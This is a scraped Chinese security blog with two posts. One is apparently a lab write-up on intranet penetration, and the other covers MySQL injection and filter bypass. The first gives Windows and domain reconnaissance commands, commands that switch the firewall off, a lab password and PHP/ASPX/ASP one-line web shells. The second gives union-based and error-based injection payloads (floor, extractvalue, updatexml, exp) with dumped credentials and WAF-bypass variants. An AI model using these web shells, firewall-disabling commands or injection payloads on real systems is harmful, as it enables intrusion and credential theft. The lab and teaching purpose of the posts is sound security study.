<p><strong>2.内网可以访问DMZ：</strong>内网用户可以管理DMZ中的服务器</p>
<p><strong>3.外网不能访问内网：</strong>如果要访问，要通过VPN</p>
<p><strong>4.外网可以访问DMZ：</strong>需要由防火墙来完成从对外地址到服务器实际地址的转换</p>
<p><strong>5.DMZ不能访问内网、不能访问外网：</strong>保护内网</p>
<p><strong>内网又可以划分为办公区和核心区：</strong></p>
<p>办公区：公司员工日常的工作区，攻击者如果想进入内网，一般会使用<strong>鱼叉攻击、水坑攻击</strong>、社工等</p>
<p>核心区：存储企业最重要的数据等信息资产，通过日志记录、安全审计等安全措施进行严密的保护</p>
<p>一般来讲，能直接访问的只有运维人员或者IT部门的主管，所以攻击者会重点关注这些用户的信息</p>
<p><strong>（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</strong></p>
<p><strong>桥接模式：</strong>在桥接网络中，虚拟机是独立的机器。虚拟机和主机就好比插在同一台交换机上的两台计算机。如果主机连接到开启了DHCP服务的(无线)路由器上，虚拟机就可以自动获取IP地址，反之需要手动配值。只要IP地址在同一网段内，局域网内所有同网段的计算机就能够互访，这样虚拟机就可以上网了。</p>
<p><strong>NAT模式(Network Address Translator):</strong>表示网络地址转换，虚拟机通过与物理机的连接来访问网络。虚拟机能够访问主机所在局域网内所有同网段的计算机，但是除了主机，局域网内的其它计算机都无法访问虚拟机。</p>
<p><strong>Host-only模式:</strong>虚拟机处于一个独立的网段中，此模式下的虚拟机是无法上网的，但是可以通过windows提供的连接共享功能实现共享上网，主机能与所有虚拟机互访。如果没用开启windows的连接共享功能，除了主机，虚拟机与主机所在局域网内的所有其他计算机之间都无法访问。</p>
<hr>
<p>kail ip:192.168.126.1</p>
<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
<p>winK3 ip:192.168.52.141</p>
<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
<p>netstat -an 查看被打开的端口列表</p>
<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
<h2 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a><strong>2.内网信息收集</strong></h2><h3 id="2-1-收集本机信息"><a href="#2-1-收集本机信息" class="headerlink" title="2.1 收集本机信息"></a><strong>2.1 收集本机信息</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 　　　　　  <span class="comment">#查询本机IP段，所在域等 </span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">" OS 版本"</span> <span class="comment">#查询操作系统版本</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">" OS VERSION"</span> <span class="comment">#英文版</span></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% <span class="comment">#查看系统体系结构  ---x86 、 amd64</span></span><br><span class="line">wmic service list brief <span class="comment">#查询本机服务信息</span></span><br><span class="line">tasklist | findstr <span class="string">"680"</span>  <span class="comment">#查看具体哪个应用被占用了,tasklist查看当前进程</span></span><br><span class="line">wmic <span class="keyword">process</span> list brief <span class="comment">#查看进程信息</span></span><br><span class="line">wmic startup get command,caption <span class="comment">#查看启动程序信息</span></span><br><span class="line">schtasks /query /fo LIST /v <span class="comment">#查看计划任务</span></span><br><span class="line">net statistics workstation <span class="comment">#查看主机开机时间</span></span><br><span class="line">net user 　　　　　　　   <span class="comment">#本机用户列表 ---可以分析内网机器的命名规则</span></span><br><span class="line">net localgroup administrators          <span class="comment">#本机管理员[通常含有域用户]</span></span><br><span class="line">query user || qwinsta  <span class="comment">#查看当前在线用户</span></span><br><span class="line">net session <span class="comment">#列出或断开本地计算机与所连接的客户端之间的会话</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看所有占用端口的列表</span></span><br><span class="line">systeminfo <span class="comment">#查看系统的详细信息，需要注意系统的版本、补丁信息等</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,Installedon <span class="comment">#查看安装在系统中的补丁</span></span><br><span class="line">net share <span class="comment">#查询本机共享列表和可访问的域共享列表</span></span><br><span class="line">route print</span><br><span class="line">arp <span class="literal">-a</span>  <span class="comment">#查询路由表以及所有可用接口的ARP缓存表</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###查询防火墙相关配值###</span></span><br><span class="line">netsh firewall set opmode disable <span class="comment">#关闭防火墙 win2003及之前的版本</span></span><br><span class="line">netsh advfirewall set allprofiles state off <span class="comment">#之后的版本</span></span><br><span class="line">netsh firewall show config <span class="comment">#查看防火墙的配值</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2查询当前权限"><a href="#2-2查询当前权限" class="headerlink" title="2.2查询当前权限"></a><strong>2.2查询当前权限</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami <span class="comment">#查看当前权限</span></span><br><span class="line">whoami /all <span class="comment">#获取域SID</span></span><br><span class="line">net user 用户名 /domain   <span class="comment">#获取指定用户的账户信息</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3判断是否存在域"><a href="#2-3判断是否存在域" class="headerlink" title="2.3判断是否存在域"></a><strong>2.3判断是否存在域</strong></h3><p>获得了本机的相关信息后，就要判断当前内网中是否存在域。<strong>如果当前内网中存在域，就需要判断所控主机是否在域内</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询当前登录域及登录用户信息</span></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org  <span class="comment">###当前登录域名</span></span><br><span class="line">登录域                       GOD   <span class="comment">#此处表示当前用户是域用户还是本地，，这里表示域用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断主域</span></span><br><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">通常有三种情况：</span><br><span class="line">存在域，但当前用户不是域用户----拒绝访问</span><br><span class="line">存在域，且是--<span class="literal">-xx</span>的当前时间是xxx</span><br><span class="line">当前网络环境是工作组----找不到域xx的域控制器</span><br></pre></td></tr></table></figure>

<h3 id="2-4探测域内存活主机"><a href="#2-4探测域内存活主机" class="headerlink" title="2.4探测域内存活主机"></a><strong>2.4探测域内存活主机</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>



<p>一句话木马：</p>
<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-MYSQL-SQL-BYPASS" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/22/MYSQL-SQL-BYPASS/"
    >MYSQL_SQL_BYPASS</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/22/MYSQL-SQL-BYPASS/" class="article-date">
  <time datetime="2020-04-22T14:26:06.000Z" itemprop="datePublished">2020-04-22</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>知其然，更要知其所以然！ </p>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
<p>我们经常用到的几个表</p>
<ol>
<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
</ol>
<p>SCHEMATA: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>user 表保存的用户密码 和host等等信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>

<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>

<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
<li><strong>过滤不严格。</strong></li>
<li><strong>数据库配置不当。</strong></li>
<li><strong>转义不当。</strong></li>
</ol>
<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
<ol>
<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
</ol>
<hr>
<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
<p>读取host与user</p>
<p>通过以上信息还能大概判断下是不是站库分离之类的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
<p>同时#被过滤，但 –+ 可以</p>
<p>order by 猜测 列数  —-爆出为3列</p>
<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>可以爆出所有表–emails,referers,uagents,users</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>

<p>可以爆出user表下的所有列—id,username,password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>

<p>爆字段—</p>
<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
<p>总结：group_concat()可以聚合起来，查看更方便</p>
<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>

<p>users表被拦截，可以用以下方法绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>Q1.floor()函数是什么？</p>
<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
<p>Q2.rand(0)是什么意思？</p>
<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>Q3.为什么会出现报错？</p>
<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
